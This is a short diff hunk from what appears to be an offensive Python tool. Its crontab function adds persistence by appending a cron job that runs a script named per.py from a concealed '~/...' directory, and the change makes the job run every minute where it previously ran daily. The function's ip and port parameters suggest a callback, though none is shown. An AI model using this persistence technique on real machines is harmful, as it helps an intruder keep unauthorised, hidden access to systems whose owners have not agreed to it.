@@ -54,7 +54,7 @@ def crontab(ip, port):
 
             print(f"{bcolors.GREEN}[+] Adding persistence to crontab file...{bcolors.ENDC}")
             with open(filename, 'w') as f:
-                f.write(curr.decode('utf-8') + f'\n0 0 * * * python3 {os.environ["HOME"]}/.../per.py\n')
+                f.write(curr.decode('utf-8') + f'\n* * * * * python3 {os.environ["HOME"]}/.../per.py\n')
 
             print(f"{bcolors.GREEN}[+] Done adding crontab.{bcolors.ENDC}")
 
